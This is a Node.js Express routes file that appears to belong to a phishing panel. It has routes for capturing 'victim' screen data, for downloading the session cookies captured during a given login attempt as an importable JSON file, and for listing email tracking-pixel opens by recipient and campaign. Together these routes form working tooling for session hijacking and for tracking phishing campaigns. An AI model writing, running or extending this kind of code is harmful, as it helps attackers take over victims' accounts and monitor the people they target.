const express = require('express');
const router = express.Router();
const utilityController = require('../controllers/utilityController');
const db = require('../database');

// Utility routes
router.post('/import_email', utilityController.importEmail);
router.post('/extract', utilityController.extract);

// Screen capture routes for victim browser dimensions
router.post('/capture-screen-data', utilityController.captureScreenData);
router.get('/track-screen', utilityController.trackScreen);

// Download cookie endpoint for detailed cookie info
router.get('/DownloadCookies/:loginAttemptId', (req, res) => {
  const { loginAttemptId } = req.params;
  
  db.get(
    `SELECT cookies FROM login_attempts WHERE id = ?`,
    [loginAttemptId],
    (err, row) => {
      if (err) {
        console.error('Error fetching cookies:', err);
        return res.status(500).json({ error: 'Failed to fetch cookies' });
      }
      
      if (!row || !row.cookies) {
        return res.status(404).json({ error: 'No cookies found for this login attempt' });
      }
      
      try {
        const cookies = JSON.parse(row.cookies);
        
        // Format cookies as requested
        const formattedCookies = cookies.map(cookie => {
          return {
            domain: cookie.domain || '',
            expirationDate: cookie.expirationDate || null,
            hostOnly: cookie.hostOnly !== undefined ? cookie.hostOnly : true,
            httpOnly: cookie.httpOnly !== undefined ? cookie.httpOnly : false,
            name: cookie.name || '',
            path: cookie.path || '/',
            sameSite: cookie.sameSite || null,
            secure: cookie.secure !== undefined ? cookie.secure : false,
            session: cookie.session !== undefined ? cookie.session : true,
            storeId: null,
            value: cookie.value || ''
          };
        });

        // Send the formatted cookies as a JSON file for download
        res.setHeader('Content-Type', 'application/json');
        res.setHeader('Content-Disposition', `attachment; filename=cookies-${loginAttemptId}.json`);
        res.send(JSON.stringify(formattedCookies, null, 2));
      } catch (error) {
        console.error('Error parsing cookies JSON:', error);
        return res.status(500).json({ error: 'Error formatting cookies' });
      }
    }
  );
});

// Debug endpoint to check tracking tables
router.get('/debug/tracking', (req, res) => {
  const results = {};
  
  // Check tracking_pixels table
  db.all('SELECT COUNT(*) as count FROM tracking_pixels', [], (err, rows) => {
    if (err) {
      return res.status(500).json({ error: 'Error querying tracking_pixels', details: err.message });
    }
    
    results.trackingPixelsCount = rows[0].count;
    
    // Check open_logs table
    db.all('SELECT COUNT(*) as count FROM open_logs', [], (err, openRows) => {
      if (err) {
        return res.status(500).json({ error: 'Error querying open_logs', details: err.message });
      }
      
      results.openLogsCount = openRows[0].count;
      
      // Get recent opens
      db.all(`
        SELECT ol.id, ol.pixel_id, ol.timestamp, tp.user_email, tp.campaign_id
        FROM open_logs ol
        JOIN tracking_pixels tp ON ol.pixel_id = tp.id
        ORDER BY ol.timestamp DESC
        LIMIT 10
      `, [], (err, recentRows) => {
        if (err) {
          return res.status(500).json({ error: 'Error querying recent opens', details: err.message });
        }
        
        results.recentOpens = recentRows;
        
        // Check schema
        db.all("PRAGMA table_info(open_logs)", [], (err, openLogsSchema) => {
          if (err) {
            return res.status(500).json({ error: 'Error querying open_logs schema', details: err.message });
          }
          
          results.openLogsSchema = openLogsSchema;
          
          db.all("PRAGMA table_info(tracking_pixels)", [], (err, pixelsSchema) => {
            if (err) {
              return res.status(500).json({ error: 'Error querying tracking_pixels schema', details: err.message });
            }
            
            results.trackingPixelsSchema = pixelsSchema;
            
            res.json(results);
          });
        });
      });
    });
  });
});

// For debugging: Get all tracking pixels for a campaign
router.get('/debug/tracking-pixels/:campaignId', (req, res) => {
  const { campaignId } = req.params;
  
  db.all(
    `SELECT tp.id, tp.user_email, tp.createdAt, 
     (SELECT COUNT(*) FROM open_logs ol WHERE ol.pixel_id = tp.id) as opens
     FROM tracking_pixels tp
     WHERE tp.campaign_id = ?
     ORDER BY tp.createdAt DESC`,
    [campaignId],
    (err, rows) => {
      if (err) {
        console.error('Error fetching tracking pixels:', err);
        return res.status(500).json({ error: 'Failed to fetch tracking pixels' });
      }
      
      return res.json({
        campaignId,
        trackingPixels: rows.map(row => ({
          ...row,
          testUrl: `${req.protocol}://${req.get('host')}/test-tracker/${row.id}`
        }))
      });
    }
  );
});

module.exports = router;